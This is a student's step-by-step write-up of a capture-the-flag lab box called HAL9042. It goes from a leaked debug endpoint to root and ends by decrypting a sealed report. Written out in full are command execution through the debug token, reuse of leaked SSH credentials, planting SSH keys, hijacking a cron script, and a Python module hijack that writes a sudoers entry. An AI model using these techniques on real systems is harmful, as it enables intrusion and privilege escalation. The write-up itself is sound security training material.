@@ -1,0 +1,592 @@
+I - access to www-data
+
+1 - I did start the ova file
+2 - there are two forwarded ports 5042 for web server and 6060 for an sshd
+3 - when I visit http://localhost:5042 (HAL9042) I found this page:
+    ```html
+    <!DOCTYPE html>
+    <html lang="en" data-corruption="0">
+    <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HAL9042 — Evaluation Server</title>
+    <link rel="stylesheet" href="/static/css/glitch.css">
+
+    <!-- TODO: remove /api/debug before launch -->
+    <!-- debug.js still in /static/js/ pls remove -->
+    <!-- norm errors everywhere but ship it -->
+    </head>
+    <body>
+    <div class="scanlines"></div>
+    <div class="vignette"></div>
+    <div id="corruption-layer"></div>
+
+    <header>
+    <a class="brand" href="/"><span class="glitch pixelate" data-text="HAL9042">HAL9042</span></a>
+    <nav>
+        <a href="/">home</a>
+        <a href="/status">status</a>
+        <a href="/feed">feed</a>
+        <a href="/evaluate">evaluate</a>
+        <a href="/appeals">appeals</a>
+        <a href="/about">about</a>
+    </nav>
+    <div class="integrity">signal integrity: <span id="integrity">100%</span></div>
+    </header>
+
+    <main>
+    
+    <section>
+        <h2>HAL9042 — automated evaluation</h2>
+        <p>The 42 Network evaluation engine. Submit a project, get a score. Faster
+        than a human. Cheaper than a human. Nearly as accurate as a human.</p>
+        <p class="dim">env=development — build dev — uptime 47 days</p>
+    </section>
+
+    <section>
+        <h2>Submit a project</h2>
+        <form action="/evaluate" method="post">
+        <input type="text" name="project_name" placeholder="project name">
+        <button type="submit">Evaluate</button>
+        </form>
+        <p class="dim">Submissions are rendered through the evaluation template engine.</p>
+    </section>
+
+    </main>
+
+    <footer>
+    <p>HAL9042 v0.4 — env=development — "I am putting myself to the fullest possible use."</p>
+    </footer>
+
+    <script src="/static/js/glitch.js"></script>
+    <script src="/static/js/main.js"></script>
+    </body>
+    </html>
+    ```
+4 - after I foudn this line:
+<!-- TODO: remove /api/debug before launch -->
+i visit it and I found this response:
+    ```HAL9042 debug endpoint.
+    usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
+
+ 5 - so I visited http://localhost:5042/api/debug?file=config.py and I found:
+    ```python
+    # HAL9042 web frontend — configuration
+    # -------------------------------------
+    # paco: do NOT commit this with real values again. (it was committed. twice.)
+
+    DB_HOST = "127.0.0.1"
+    DB_NAME = "hal9042"
+    DB_USER = "hal9042"
+    DB_PASS = "Moulinette2024!"
+
+    SECRET_KEY = "hal9042secret"
+
+    # Internal maintenance token. The /api/debug console accepts this token to run
+    # diagnostic commands. Was supposed to be rotated before launch.
+    ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
+
+    # Legacy debug endpoint. "removed" in a later commit (see git log) but the route
+    # is still wired in app.py.
+    DEBUG_ENDPOINT = "/api/debug"
+    ENV = "development"
+    ```
+
+6 - and then I used SECRET_KEY to request http://localhost:5042/api/debug?cmd=id&token=h4l_d3bug_t0k3n_2024
+and I get this response:
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+so now I have an RCE
+
+7 - so now I becomes a www-data user
+
+8 - then I found:
+root         631  0.0  0.0   2720  1612 ?        Ss   20:00   0:00 /usr/local/sbin/flagd
+and then I found also:
+ls -al /run/flagd
+drwxr-xr-x  2 root root 140 Nov  4 20:00 .
+drwxr-xr-x 29 root root 880 Nov  4 20:26 ..
+srw-rw-rw-  1 root root   0 Nov  4 20:00 ol.sock
+srw-rw-rw-  1 root root   0 Nov  4 20:00 paco.sock
+srw-rw-rw-  1 root root   0 Nov  4 20:00 sophie.sock
+srw-rw-rw-  1 root root   0 Nov  4 20:00 wil.sock
+srw-rw-rw-  1 root root   0 Nov  4 20:00 www.sock
+
+9 - so I did: nc -U /run/flagd/www.sock
+and I get those flags:
+FLAG{r3c0n_1s_k1ng}
+FLAG{g1t_n3v3r_f0rg3ts}
+FLAG{s3m1_bl1nd_st1ll_burns}
+FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
+
+II - access to paco user
+
+1 - I did visit paco user home and I found:
+    ls -al /home/paco
+    total 44
+    drwxr-xr-x 5 paco paco 4096 Jun  6 12:30 .
+    drwxr-xr-x 9 root root 4096 Jun  6 12:29 ..
+    -rw-r--r-- 1 paco paco  274 Jun  6 12:30 .bash_history
+    -rw-r--r-- 1 paco paco  220 Mar 31  2024 .bash_logout
+    -rw-r--r-- 1 paco paco 3771 Mar 31  2024 .bashrc
+    -rw-r--r-- 1 paco paco  188 Jun  6 12:30 .env.old
+    drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 notes
+    -rw-r--r-- 1 paco paco  807 Mar 31  2024 .profile
+    drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 scripts
+    drwxr-xr-x 2 paco paco 4096 Jun  6 12:30 src
+    -rw-r--r-- 1 paco paco  461 Jun  6 12:30 TODO.md
+
+2 - then I cat .env.old and I get:
+# old deploy env — paco. delete this. (you will not delete this)
+    DB_PASS=Moulinette2024!
+    SECRET_KEY=hal9042secret
+    # ssh creds used by the deploy bot
+    SSH_USER=paco
+    SSH_PASS=Pac0_H4L_dev!
+
+3 - I did use those creds to connect to ssh and boom it works "paco@hal9042:~$"
+
+4 - so I did: nc -U /run/flagd/paco.sock
+and I get those flags:
+FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
+
+III - access to user wil
+
+1 - then I found this file:
+    paco@hal9042:~/src$ ls -al
+    total 12
+    drwxr-xr-x 2 paco paco 4096 Nov  4 21:43 .
+    drwxr-xr-x 6 paco paco 4096 Nov  4 21:43 ..
+    -rw-r--r-- 1 paco paco 3527 Jun  6 12:30 evaluator.c
+    paco@hal9042:~/src$ cat evaluator.c 
+    /*
+    * hal9042d — HAL9042 evaluation daemon
+    * ------------------------------------
+    * Listens on 127.0.0.1:7042. Receives a "project name" to evaluate and
+    * returns a (fabricated) score. Runs as user `wil` (see systemd unit).
+    *
+    * NOTE(paco): left the debug command handler in. it executes shell commands
+    * so i can poke the evaluator from another terminal without redeploying.
+    * TODO: disable debug mode before prod <- paco seriously
+    *
+    * Build:  gcc -O2 -o hal9042d evaluator.c
+    */
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <unistd.h>
+    #include <signal.h>
+    #include <time.h>
+    #include <arpa/inet.h>
+    #include <sys/socket.h>
+    #include <sys/types.h>
+    #include <sys/wait.h>
+    #include <netinet/in.h>
+
+    #define PORT      7042
+    #define BIND_ADDR "127.0.0.1"
+    #define BACKLOG   16
+    #define BUFSZ     4096
+
+    /* debug command prefix — local testing only. (paco: remove before prod) */
+    static const char *DEBUG_PREFIX = "DEBUG:";
+
+    static void banner(int fd)
+    {
+        static const char *b =
+            "HAL9042 evaluation daemon — v0.4 (build dev)\n"
+            "Submit a project name to evaluate. One line per request.\n"
+            "> ";
+        write(fd, b, strlen(b));
+    }
+
+    /* Fabricated "evaluation" so the service looks alive on a port scan. */
+    static void evaluate(int fd, const char *name)
+    {
+        char out[BUFSZ];
+        /* HAL is known to return scores above the theoretical maximum. */
+        int score = (int)(strlen(name) * 7 + 42) % 126;
+        snprintf(out, sizeof(out),
+                "[HAL9042] evaluating \"%.200s\" ...\n"
+                "[HAL9042] confidence_score = %d/100\n"
+                "[HAL9042] verdict: %s\n> ",
+                name, score, score >= 50 ? "PASS" : "FAIL");
+        write(fd, out, strlen(out));
+    }
+
+    static void handle(int fd)
+    {
+        char buf[BUFSZ];
+        ssize_t n;
+
+        banner(fd);
+
+        while ((n = read(fd, buf, sizeof(buf) - 1)) > 0) {
+            buf[n] = '\0';
+            /* trim trailing CR/LF */
+            while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
+                buf[--n] = '\0';
+            if (n == 0) { write(fd, "> ", 2); continue; }
+
+            if (strncmp(buf, DEBUG_PREFIX, strlen(DEBUG_PREFIX)) == 0) {
+                const char *cmd = buf + strlen(DEBUG_PREFIX);
+                /* Wire the client socket to the child's stdio so command output
+                * (and an interactive shell) flows back over the connection. */
+                dup2(fd, 0);
+                dup2(fd, 1);
+                dup2(fd, 2);
+                system(cmd);                 /* executes as wil */
+                write(fd, "> ", 2);
+                continue;
+            }
+
+            evaluate(fd, buf);
+        }
+    }
+
+    int main(void)
+    {
+        int srv, cli, opt = 1;
+        struct sockaddr_in addr;
+
+        signal(SIGCHLD, SIG_IGN);            /* reap children automatically */
+        signal(SIGPIPE, SIG_IGN);
+
+        srv = socket(AF_INET, SOCK_STREAM, 0);
+        if (srv < 0) { perror("socket"); return 1; }
+        setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+
+        memset(&addr, 0, sizeof(addr));
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(PORT);
+        addr.sin_addr.s_addr = inet_addr(BIND_ADDR);
+
+        if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+            perror("bind"); return 1;
+        }
+        if (listen(srv, BACKLOG) < 0) { perror("listen"); return 1; }
+
+        for (;;) {
+            cli = accept(srv, NULL, NULL);
+            if (cli < 0) continue;
+            pid_t pid = fork();
+            if (pid == 0) {
+                close(srv);
+                handle(cli);
+                close(cli);
+                _exit(0);
+            }
+            close(cli);
+        }
+        return 0;
+    }
+
+    runs in port 7042
+
+this is process running it:
+    644 wil         20   0  2548  1412  1320 S   0.0  0.1  0:00.00 /opt/hal9042/daemon
+
+2 - so I connect to this port to interact with it:
+    paco@hal9042:~/src$ nc localhost 7042
+    HAL9042 evaluation daemon — v0.4 (build dev)
+    Submit a project name to evaluate. One line per request.
+    > DEBUG:id
+    uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
+    > 
+so it runs as user wil
+
+3 - so I did add my ssh key to authorized_keys file:
+    DEBUG:echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKjWltG+Q5dqrsXZt9dsC/UMFIfLz4apxD/ZLaEMFYjs serhouni@e1r5p7.1337.ma' > /home/wil/.ssh/authorized_keys
+
+4 - then it tried to connect to wil via ssh "ssh -p 6060 wil@localhost", boom it works: wil@hal9042:~$
+
+5 - so I did: nc -U /run/flagd/wil.sock
+and I get those flags:
+FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
+
+IV - access to sophie user
+
+1 - i did found a private ssh key of sophie:
+    wil@hal9042:~/.ssh$ ls
+    authorized_keys  id_rsa_sophie.enc  known_hosts  known_hosts.old
+
+2 - when I tried to connect with it via ssh it required a passphrase:
+    $ ssh -i id_rsa_sophie.enc -p 6060 sophie@localhost 
+Enter passphrase for key 'id_rsa_sophie.enc':
+
+3 - so I did crack it with rockyou.txt and I foudn that the pass phrase is "iloveyou"
+
+4 - then I connect to it again and boom it works: sophie@hal9042:~$
+
+5 - so I did: nc -U /run/flagd/sophie.sock
+and I get those flags:
+FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
+
+V - access to ol (access it from wil)
+
+1 - I found this script in ol home:
+    wil@hal9042:/home/ol/scripts$ ls -al
+    total 12
+    drwxr-xr-x 2 ol ol      4096 Jun  6 12:30 .
+    drwxr-xr-x 8 ol ol      4096 Nov  4 22:30 ..
+    -rwxrwxr-x 1 ol evalops  565 Nov  4 22:29 check.sh
+    wil@hal9042:/home/ol/scripts$ cat check.sh 
+    #!/bin/bash
+    # check.sh — HAL9042 health probe
+    # Run from ol's crontab every 5 minutes. Writes a heartbeat to the log.
+    #
+    # ol: keep this lightweight. it runs as me, every 5 min, forever.
+
+    LOG=/var/log/hal9042/check.log
+    echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
+    echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
+
+2 - I did check what pivs I have over this file so:
+    wil@hal9042:/home/ol/scripts$ id
+    uid=1002(wil) gid=1004(wil) groups=1004(wil),1001(evalops)
+    wil@hal9042:/home/ol/scripts$ ls -al check.sh 
+    -rwxrwxr-x 1 ol evalops 565 Nov  4 22:29 check.sh
+
+3 - so I can write to it which the user execute is it later so I did add my ssh key:
+    LOG=/var/log/hal9042/check.log
+    echo "$(date -u +%FT%TZ) [check] hal9042d heartbeat: nominal" >> "$LOG" 2>/dev/null
+    echo "$(date -u +%FT%TZ) [check] confidence: nominal" >> "$LOG" 2>/dev/null
+    mkdir -p /home/ol/.ssh
+    echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKjWltG+Q5dqrsXZt9dsC/UMFIfLz4apxD/ZLaEMFYjs serhouni@e1r5p7.1337.ma' > /home/ol/.ssh/authorized_keys
+    touch /tmp/pwned
+
+4 - after some time it id connect to the user ol via ssh connection: ol@hal9042:~$
+
+5 - so I did: nc -U /run/flagd/ol.sock
+and I get those flags:
+FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}
+
+- VI access root (via ol user)
+
+1 - after running sudo -l i get:
+    ol@hal9042:~$ sudo -l
+    Matching Defaults entries for ol on hal9042:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+    User ol may run the following commands on hal9042:
+        (root) NOPASSWD: /opt/hal9042/scripts/report.py
+
+2 - i did cat the report.py file:
+    ol@hal9042:/opt/hal9042/scripts$ cat report.py 
+    #!/usr/bin/env python3
+    """
+    report.py — HAL9042 nightly evaluation report generator
+    =======================================================
+    Run by ol via sudo (see `sudo -l`). Aggregates the day's evaluations into a
+    summary using the shared helpers in /opt/hal9042/lib.
+
+    ol ALL=(root) NOPASSWD: /opt/hal9042/scripts/report.py
+    """
+    import sys
+
+    # Shared evaluation helpers live in the team-writeable lib dir.
+    sys.path.insert(0, "/opt/hal9042/lib")
+
+    import moulai_utils   # noqa: E402  (provided by the lib/ directory)
+
+
+    def main():
+        print("[report] HAL9042 nightly report")
+        print("[report] evaluations today:", moulai_utils.count_today())
+        print("[report] done.")
+
+
+    if __name__ == "__main__":
+        main()
+
+3 - and I found that I have the right to write to this file:
+    ol@hal9042:/opt/hal9042/lib$ ls -al
+    total 12
+    drwxrwxr-x 2 root hal9042 4096 Jun  6 12:30 .
+    drwxr-xr-x 8 root root    4096 Jun  6 12:31 ..
+    -rw-rw-r-- 1 root hal9042  384 Jun  6 12:30 moulai_utils.py
+    ol@hal9042:/opt/hal9042/lib$ groups
+    ol hal9042
+    3 - so I did inject sudoers with:
+    """
+    moulai_utils — shared helpers for the HAL9042 report tooling.
+    Imported by /opt/hal9042/scripts/report.py (which ol runs as root via sudo).
+
+    This file lives in the team-writeable lib dir. Whatever is here runs with the
+    privileges of whoever imports it.
+    """
+    import time
+    import os
+    os.system("echo 'ol ALL=(ALL:ALL) NOPASSWD: ALL' > /etc/sudoers.d/ol-pwned")
+
+    def count_today():
+        """Pretend to count today's evaluations."""
+        return 1247 + int(time.time()) % 100
+
+4 - and I ran it:
+    ol@hal9042:/opt/hal9042/lib$ sudo /opt/hal9042/scripts/report.py 
+    [report] HAL9042 nightly report
+    [report] evaluations today: 1299
+    [report] done.
+    ol@hal9042:/opt/hal9042/lib$ sudo -l
+    Matching Defaults entries for ol on hal9042:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+    User ol may run the following commands on hal9042:
+        (ALL : ALL) NOPASSWD: ALL
+        (root) NOPASSWD: /opt/hal9042/scripts/report.py
+
+and I become able to run sudo.
+
+5 - ol@hal9042:/opt/hal9042/lib$ sudo bash
+    root@hal9042:/opt/hal9042/lib# id
+    uid=0(root) gid=0(root) groups=0(root)
+
+VII - decrypt rapport_final.enc
+
+1 - i did found this file in paco's home:
+    cat encrypt.py 
+    #!/usr/bin/env python3
+    """
+    encrypt.py  —  HAL9042 report sealing tool   (paco)
+    ===================================================
+    Used to seal Ol's final report (rapport_final.enc).
+
+    Scheme:
+        cipher  = AES-256-ECB                       (yes. ECB. i know. it was fast.)
+        key     = sha256( part1 + part2 + part3 + part4 )   # 64 hex chars
+
+    The four key parts were split across the people who needed to agree before the
+    report could ever be opened. No single person can decrypt it alone. Each one
+    keeps a `.key_part` file:
+
+        part 1 : ol      (~/.config/.key_part)
+        part 2 : wil     (~/data/.key_part)
+        part 3 : sophie  (~/drafts/.key_part)
+        part 4 : xavier  (/tmp/.xn/.key_part)
+
+    Concatenate the four parts IN THAT ORDER, sha256 them, and that hex digest is
+    the AES-256 key.
+
+    Decrypt (once you have all four parts):
+
+        KEY=$(printf '%s%s%s%s' "$P1" "$P2" "$P3" "$P4" | sha256sum | cut -d' ' -f1)
+        openssl enc -d -aes-256-ecb -K "$KEY" -in rapport_final.enc -out rapport_final.txt
+    """
+    import hashlib
+    import subprocess
+    import sys
+
+
+    def derive_key(p1, p2, p3, p4):
+        """The exact key derivation used to seal the report."""
+        blob = (p1 + p2 + p3 + p4).encode()
+        return hashlib.sha256(blob).hexdigest()
+
+
+    def seal(plaintext_path, enc_path, key_hex):
+        subprocess.run(
+            ["openssl", "enc", "-aes-256-ecb", "-K", key_hex,
+            "-in", plaintext_path, "-out", enc_path],
+            check=True)
+
+
+    def open_report(enc_path, out_path, key_hex):
+        subprocess.run(
+            ["openssl", "enc", "-d", "-aes-256-ecb", "-K", key_hex,
+            "-in", enc_path, "-out", out_path],
+            check=True)
+
+
+    if __name__ == "__main__":
+        if len(sys.argv) != 5:
+            print("usage: encrypt.py <part1> <part2> <part3> <part4>")
+            print("       prints the AES-256 key derived from the four parts")
+            sys.exit(1)
+        print(derive_key(*sys.argv[1:5]))
+
+2 - then I found the encrypted report:
+ls -al rapport_final.enc 
+    -rw-r--r-- 1 ol ol 2416 Jun  6 12:30 rapport_final.enc
+
+3 - so I did get all key parts:
+    /home/ol/.config/.key_part      M0ul1n3tt3
+    /home/wil/data/.key_part        847_4n0m4l13s
+    /home/sophie/drafts/.key_part   S0ph13_J14
+    /tmp/.xn/.key_part              uid1337
+
+4 - then I tried to decrypt it using the hash of the key:
+    KEY=$(printf "M0ul1n3tt3847_4n0m4l13sS0ph13_J14uid1337" | sha256sum | cut -d' ' -f1)
+    openssl enc -d -aes-256-ecb -K "$KEY" -in rapport_final.enc -out rapport_final.txt
+
+5 - and voila it works:
+    cat rapport_final.txt 
+    ================================================================================
+    FINAL REPORT — state of the HAL9042 project
+    ol · Moulinette (2013–2024) · CONFIDENTIAL
+    ================================================================================
+
+    This is the sealed version. If you're reading this, the four keys were
+    reunited. Nobody was supposed to be able to open it alone. That was the point.
+
+    --------------------------------------------------------------------------------
+    1. WHAT I MEASURED
+    --------------------------------------------------------------------------------
+    HAL9042 does not check. It guesses. Across 2,400 evaluations replayed by hand:
+    - real hallucination rate: 0.61   (paco reported 0.43)
+    - 847 aberrant evaluations confirmed by wil
+    - an empty main.c scored 125/100
+    - a perfect libft scored 0/100
+
+    Moulinette was unfair sometimes. But it didn't guess. It checked.
+
+    --------------------------------------------------------------------------------
+    2. PROJET FORK  (extract from the board PDF — reconstructed from memory)
+    --------------------------------------------------------------------------------
+    Phase 1 : HAL9042 replaces Moulinette                 (J+14)
+    Phase 2 : Bocal sessions "assisted" by the AI         (Q2)
+    Phase 3 : Pedagogical team "optimized"                (Q4)
+    Phase 4 : 42 becomes the first fully-AI school.
+                The "students" are AI agents evaluated by an AI.
+                The human campus becomes a showroom.
+
+    They called it HAL9042. The irony was lost on them.
+
+    --------------------------------------------------------------------------------
+    3. XAVIER
+    --------------------------------------------------------------------------------
+    Xavier (uid 1337) found PROJET FORK first. He asked questions.
+    His account was deleted 48h later. But a deleted account leaves traces:
+    its inodes, its backups, its last message never sent.
+
+    FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
+
+    He isn't entirely gone. That's something.
+
+    --------------------------------------------------------------------------------
+    4. WHAT REMAINS
+    --------------------------------------------------------------------------------
+    The full report (40 pages) is in the password-protected PDF, in /root.
+    The password isn't written anywhere in one piece. It's in fragments, like
+    everything else in this story. You have to read all of it to reassemble it.
+
+    — ol
+
+4 - so the flag is: FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}
+
+VIII - decrypt PROJET_FORK_HAL9042.pdf
+
+1 - afer I become root I checked the the home of root and I found:
+    root@hal9042:~# ls -al PROJET_FORK_HAL9042.pdf 
+    -rw------- 1 root root 4309 Jun  6 12:30 PROJET_FORK_HAL9042.pdf
+
+2 - but when I tried to open it, it required a password
+
+3 - so I did go to sophie .bash_history and I found this command:
+    ls -la drafts/
+    cat inbox/board_launch_order.txt
+    # board wants the FORK doc restricted before it goes to /root
+    qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
+    sudo mv PROJET_FORK_HAL9042.pdf /root/
+
+4 - then I used Pr0j3tF0rk_J14 as password and I found the flag in the fourth page:
+FLAG{m0ul1n3tt3_w4s_n3v3r_ju5t_4_scr1pt}
